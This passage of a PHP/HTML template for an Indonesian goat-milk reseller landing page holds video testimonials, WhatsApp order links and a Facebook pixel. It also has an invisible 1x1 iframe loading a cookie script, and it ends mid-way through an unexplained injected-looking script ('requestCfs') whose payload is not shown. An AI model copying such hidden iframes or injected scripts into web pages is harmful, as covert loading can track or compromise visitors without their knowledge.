                                                                                </ul>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-5a93c33 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="5a93c33" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-container elementor-column-gap-default">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-b9c3fde elementor-column elementor-col-100 elementor-top-column" data-id="b9c3fde" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-813eccc elementor-widget elementor-widget-spacer" data-id="813eccc" data-element_type="widget" data-widget_type="spacer.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-spacer">
                                                        <div class="elementor-spacer-inner"></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="elementor-element elementor-element-646140b elementor-widget elementor-widget-heading" data-id="646140b" data-element_type="widget" data-widget_type="heading.default">
                                                <div class="elementor-widget-container">
                                                    <h2 class="elementor-heading-title elementor-size-default">APA KATA MEREKA TENTANG SUPERGOAT</h2></div>
                                            </div>
                                            <section class="elementor-element elementor-element-c7a70a4 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="c7a70a4" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-f346a8a elementor-column elementor-col-50 elementor-inner-column" data-id="f346a8a" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-75ce808 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="75ce808" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/e0Db6eJyMvk?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-a247ee4 elementor-column elementor-col-50 elementor-inner-column" data-id="a247ee4" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-d6290c0 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="d6290c0" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/h5LT-R0bFzQ?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-9ce3a7d elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="9ce3a7d" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-25b8e8d elementor-column elementor-col-50 elementor-inner-column" data-id="25b8e8d" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-69f33da elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="69f33da" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/0AvQVYU33jI?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-123dccb elementor-column elementor-col-50 elementor-inner-column" data-id="123dccb" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-fec55b0 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="fec55b0" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/tsHQ2YryMiU?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-8c8174e elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="8c8174e" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-1b2fb2d elementor-column elementor-col-50 elementor-inner-column" data-id="1b2fb2d" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-0b30133 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="0b30133" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/QT-KLIwugbY?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-77c6a2c elementor-column elementor-col-50 elementor-inner-column" data-id="77c6a2c" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-646d6a3 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="646d6a3" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/wmACBJFsuEw?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-3a830d4 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="3a830d4" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-a448126 elementor-column elementor-col-50 elementor-inner-column" data-id="a448126" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-8c820c2 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="8c820c2" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/lXz_qa82cZ4?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-71d44ab elementor-column elementor-col-50 elementor-inner-column" data-id="71d44ab" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-02bf25f elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="02bf25f" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/s0r3b5-fAaM?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-d3b08b6 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="d3b08b6" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-00b14b1 elementor-column elementor-col-50 elementor-inner-column" data-id="00b14b1" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-c26a642 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="c26a642" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/tDL_p_Rt_4Y?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-ae2b86d elementor-column elementor-col-50 elementor-inner-column" data-id="ae2b86d" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-c6e35d5 elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="c6e35d5" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/1Hz0EZUiIdE?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <div class="elementor-element elementor-element-533324b elementor-widget elementor-widget-spacer" data-id="533324b" data-element_type="widget" data-widget_type="spacer.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-spacer">
                                                        <div class="elementor-spacer-inner"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-255a9159 elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="255a9159" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-3e7fd3f1 elementor-column elementor-col-100 elementor-top-column" data-id="3e7fd3f1" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-background-overlay"></div>
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-e91b8a6 elementor-widget elementor-widget-image" data-id="e91b8a6" data-element_type="widget" data-widget_type="image.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-image"> <img width="960" height="117" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/15.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/15.png 960w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/15-300x37.png 300w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/15-768x94.png 768w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/15-860x105.png 860w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/15-600x73.png 600w" sizes="(max-width: 960px) 100vw, 960px" /></div>
                                                </div>
                                            </div>
                                            <section class="elementor-element elementor-element-1e73ac1 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="1e73ac1" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-9b7bbd4 elementor-column elementor-col-20 elementor-inner-column" data-id="9b7bbd4" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-e3df18a elementor-column elementor-col-20 elementor-inner-column" data-id="e3df18a" data-element_type="column" style="margin-left: 10%;">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-41f3e03 elementor-widget elementor-widget-spacer" data-id="41f3e03" data-element_type="widget" data-widget_type="spacer.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-spacer">
                                                                                <div class="elementor-spacer-inner"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-788acf8 elementor-column elementor-col-20 elementor-inner-column" data-id="788acf8" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-0137fd3 elementor-widget elementor-widget-image" data-id="0137fd3" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="351" height="622" src="<?= base_url();?>/assets/produk.jpg" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/produk.jpg 351w, <?= base_url();?>/assets/produk.jpg 169w" sizes="(max-width: 351px) 100vw, 351px" /></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-100279f elementor-widget elementor-widget-text-editor" data-id="100279f" data-element_type="widget" data-widget_type="text-editor.default">
                                                                        <div class="elementor-widget-container" style="background-color:green;">
                                                                            <div class="elementor-text-editor elementor-clearfix"> <span style="color: #ffffff;"><a href="https://wa.me/<?= $nomor_telepon ?>?text=Saya+ingin+pesan+8+kotak+SuperGoat.+Bagaimana+caranya%3F" target="blank">BELI SEKARANG</a></span></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-100279f elementor-widget elementor-widget-text-editor" data-id="100279f" data-element_type="widget" data-widget_type="text-editor.default">
                                                                        <div class="elementor-widget-container" style="background-color:green;">
                                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                            <span style="color: #ffffff;"><a href="http://saudagarkaya.com/reseller/<?= $username; ?>" >DAFTAR RESELLER</a></span>
                                                                             </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-711e554 elementor-column elementor-col-20 elementor-inner-column" data-id="711e554" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <div class="elementor-element elementor-element-226210e elementor-widget elementor-widget-shortcode" data-id="226210e" data-element_type="widget" data-widget_type="shortcode.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-shortcode">
                                                        <center>
                                                        	<br>
                                                        	<img src="<?=  $foto ?>" style="width: 145px;height: 145px;border: 50px;">
                                                             <strong> <br><br> KONSULTAN SAUDAGAR KAYA ANDA <br></strong><?=  $member['nama'] ?>
                                                            <br> <a style='color:blue;' href="https://wa.me/<?= $nomor_telepon ?>?text=Saya%20pesan%20susu%20kambing%20supergoatd+%2Cgimana%20caranya%3F" target="blank">Chat WA</a></center>

                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-c5d0586 elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="c5d0586" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-cbd045e elementor-column elementor-col-100 elementor-top-column" data-id="cbd045e" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-background-overlay"></div>
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-5eb1c46 elementor-widget elementor-widget-heading" data-id="5eb1c46" data-element_type="widget" data-widget_type="heading.default">
                                                <div class="elementor-widget-container">
                                                    <p class="elementor-heading-title elementor-size-default">SUSU KAMBING ADALAH MINUMAN ROSUL, Sehingga siapapun yang mengkonsumsinya
                                                        <br/> insyaAllah mendapatkan pahala
                                                        <br/> Semoga Allah senantiasa memberikan keberkahan dan keberlimpahan kepada kita semua. Aamiin..</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-a66e97a elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="a66e97a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-136b3c5 elementor-column elementor-col-100 elementor-top-column" data-id="136b3c5" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-background-overlay"></div>
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-4156612 elementor-widget elementor-widget-heading" data-id="4156612" data-element_type="widget" data-widget_type="heading.default">
                                                <div class="elementor-widget-container">
                                                    <p class="elementor-heading-title elementor-size-default">@<?= date('Y') ?> saudagarkaya.com </p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
            </div>
        </div>
    </div>
    <iframe src="<?= base_url();?>/assets/index/wp-content/plugins/wp-affiliasi/kue.php?reg=kedai" style="height:1px; width:1px; visibility: hidden;"></iframe>
    <script type="text/javascript" src="../../cdn.jsdelivr.net/jquery.marquee/1.4.0/jquery.marquee.min.js"></script>
    <script type="text/javascript">
        var $k = jQuery.noConflict();
        $k(function() {
            $k(".marquee").marquee({
                duplicated: true
            });
        });
    </script>
    <script src="<?= base_url();?>/assets/index/wp-content/plugins/wp-affiliasi/croppic.min.js"></script>
    <script type="text/javascript">
        var croppicHeaderOptions = {
            uploadUrl: "<?= base_url();?>/assets/index/wp-content/plugins/wp-affiliasi/img_save_to_file.php",
            cropData: {
                "dummyData": 1,
                "dummyData2": "asdas"
            },
            cropUrl: "<?= base_url();?>/assets/index/wp-content/plugins/wp-affiliasi/img_crop_to_file.php",
            outputUrlId: "pic_profil",
            customUploadButtonId: "cropContainerHeaderButton",
            modal: true,
            processInline: true,
            enableMousescroll: true,
            doubleZoomControls: false,
            rotateControls: false,
            loaderHtml: "<div class=\"loader bubblingG\"><span id=\"bubblingG_1\"></span><span id=\"bubblingG_2\"></span><span id=\"bubblingG_3\"></span></div>",
            onBeforeImgUpload: function() {
                console.log("onBeforeImgUpload")
            },
            onAfterImgUpload: function() {
                console.log("onAfterImgUpload")
            },
            onImgDrag: function() {
                console.log("onImgDrag")
            },
            onImgZoom: function() {
                console.log("onImgZoom")
            },
            onBeforeImgCrop: function() {
                console.log("onBeforeImgCrop")
            },
            onAfterImgCrop: function() {
                console.log("onAfterImgCrop")
            },
            onReset: function() {
                console.log("onReset")
            },
            onError: function(errormessage) {
                console.log("onError:" + errormessage)
            }
        }
        var croppic = new Croppic("croppic", croppicHeaderOptions);
    </script>
    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="pswp__bg"></div>
        <div class="pswp__scroll-wrap">
            <div class="pswp__container">
                <div class="pswp__item"></div>
                <div class="pswp__item"></div>
                <div class="pswp__item"></div>
            </div>
            <div class="pswp__ui pswp__ui--hidden">
                <div class="pswp__top-bar">
                    <div class="pswp__counter"></div>
                    <button class="pswp__button pswp__button--close" aria-label="Tutup (Esc)"></button>
                    <button class="pswp__button pswp__button--share" aria-label="Bagikan"></button>
                    <button class="pswp__button pswp__button--fs" aria-label="Layar Penuh"></button>
                    <button class="pswp__button pswp__button--zoom" aria-label="Perbesar/perkecil"></button>
                    <div class="pswp__preloader">
                        <div class="pswp__preloader__icn">
                            <div class="pswp__preloader__cut">
                                <div class="pswp__preloader__donut"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                    <div class="pswp__share-tooltip"></div>
                </div>
                <button class="pswp__button pswp__button--arrow--left" aria-label="Sebelumnya (panah kiri)"></button>
                <button class="pswp__button pswp__button--arrow--right" aria-label="Berikutnya (panah kanan)"></button>
                <div class="pswp__caption">
                    <div class="pswp__caption__center"></div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript">
        var c = document.body.className;
        c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
        document.body.className = c;
    </script>
    <script type='text/javascript'>
        var wpcf7 = {
            "apiSettings": {
                "root": "http:\/\/kedai.supergoat.biz\/wp-json\/contact-form-7\/v1",
                "namespace": "contact-form-7\/v1"
            }
        };
    </script>
    <script type='text/javascript'>
        var wc_add_to_cart_params = {
            "ajax_url": "\/wp-admin\/admin-ajax.php",
            "wc_ajax_url": "\/?wc-ajax=%%endpoint%%",
            "i18n_view_cart": "Lihat keranjang",
            "cart_url": "http:\/\/kedai.supergoat.biz\/cart\/",
            "is_cart": "",
            "cart_redirect_after_add": "yes"
        };
    </script>
    <script type='text/javascript'>
        var woocommerce_params = {
            "ajax_url": "\/wp-admin\/admin-ajax.php",
            "wc_ajax_url": "\/?wc-ajax=%%endpoint%%"
        };
    </script>
    <script type='text/javascript'>
        var wc_cart_fragments_params = {
            "ajax_url": "\/wp-admin\/admin-ajax.php",
            "wc_ajax_url": "\/?wc-ajax=%%endpoint%%",
            "cart_hash_key": "wc_cart_hash_2ef554e78ed74bfeab7805f5e8e7d7cf",
            "fragment_name": "wc_fragments_2ef554e78ed74bfeab7805f5e8e7d7cf",
            "request_timeout": "5000"
        };
    </script>
    <script type='text/javascript'>
        var _wpUtilSettings = {
            "ajax": {
                "url": "\/wp-admin\/admin-ajax.php"
            }
        };
    </script>
    <script type='text/javascript'>
        var wc_add_to_cart_variation_params = {
            "wc_ajax_url": "\/?wc-ajax=%%endpoint%%",
            "i18n_no_matching_variations_text": "Maaf, tidak ada produk yang cocok dengan pilihan Anda. Silakan pilih kombinasi yang berbeda.",
            "i18n_make_a_selection_text": "Pilih beberapa opsi produk sebelum menambahkannya ke keranjang",
            "i18n_unavailable_text": "Maaf, produk ini tidak tersedia. Silakan pilih kombinasi yang berbeda."
        };
    </script>
    <script type='text/javascript'>
        var _warrior = {
            "cart_redirection": "yes",
            "cart_url": "http:\/\/kedai.supergoat.biz\/cart\/",
            "currency_woo": "IDR",
            "js_textdomain": ["Navigation", "Login", "Mendaftar", "Filter", "Tersalin"]
        };
        var wc_ajax = {
            "ajax_url": "http:\/\/supergoat.biz\/wp-admin\/admin-ajax.php",
            "cepatlakoo_path": "http:\/\/supergoat.biz\/wp-content\/themes\/cepatlakoo"
        };
        var _cepatlakoo = [];
        var _fbpixel = {
            "fbpixel": " 448478445832775"
        };
        var _fbpixel_purchase = [];
        var _fbpixel_initCheckout = [];
        var _fbpixel_checkoutEvent = {
            "type": "InitiateCheckout"
        };
    </script>
    <script type='text/javascript'>
        var wc_single_product_params = {
            "i18n_required_rating_text": "Silakan pilih penilaian",
            "review_rating_required": "yes",
            "flexslider": {
                "rtl": false,
                "animation": "slide",
                "smoothHeight": true,
                "directionNav": false,
                "controlNav": "thumbnails",
                "slideshow": false,
                "animationSpeed": 500,
                "animationLoop": false,
                "allowOneSlide": false
            },
            "zoom_enabled": "1",
            "zoom_options": [],
            "photoswipe_enabled": "1",
            "photoswipe_options": {
                "shareEl": false,
                "closeOnScroll": false,
                "history": false,
                "hideAnimationDuration": 0,
                "showAnimationDuration": 0
            },
            "flexslider_enabled": "1"
        };
    </script>
    <script type='text/javascript'>
        var ElementorMenusFrontendConfig = {
            "ajaxurl": "http:\/\/supergoat.biz\/wp-admin\/admin-ajax.php",
            "nonce": "df41093a46"
        };
        var elementorScreenReaderText = {
            "expand": "expand child menu",
            "collapse": "collapse child menu"
        };
        var elementorSecondaryScreenReaderText = {
            "expand": "expand child menu",
            "collapse": "collapse child menu"
        };
    </script>
    <script type='text/javascript' src='<?= base_url();?>/assets/index/wp-content/plugins/elementor/assets/js/frontend-modules.mind7ad.js?ver=2.6.6'></script>
    <script type='text/javascript'>
        var elementorFrontendConfig = {
            "environmentMode": {
                "edit": false,
                "wpPreview": false
            },
            "is_rtl": false,
            "breakpoints": {
                "xs": 0,
                "sm": 480,
                "md": 768,
                "lg": 1025,
                "xl": 1440,
                "xxl": 1600
            },
            "version": "2.6.6",
            "urls": {
                "assets": "http:\/\/supergoat.biz\/wp-content\/plugins\/elementor\/assets\/"
            },
            "settings": {
                "page": [],
                "general": {
                    "elementor_global_image_lightbox": "yes",
                    "elementor_enable_lightbox_in_editor": "yes"
                }
            },
            "post": {
                "id": 440,
                "title": "Toko",
                "excerpt": ""
            }
        };
    </script>
    <script type='text/javascript' src='<?= base_url();?>/assets/index/wp-content/plugins/elementor/assets/js/frontend.mind7ad.js?ver=2.6.6'></script>
    <script>
        ! function(f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function() {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window,
            document, 'script', '../../connect.facebook.net/en_US/fbevents.js');
        fbq('init', ' 448478445832775'); // Insert your pixel ID here.
    </script>
    <noscript> <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=448478445832775&amp;ev=PageView&amp;noscript=1" /> </noscript>
    <script defer src="<?= base_url();?>/assets/index/wp-content/cache/autoptimize/js/autoptimize_09624eb6f642da640c0b3fa240663e63.js"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
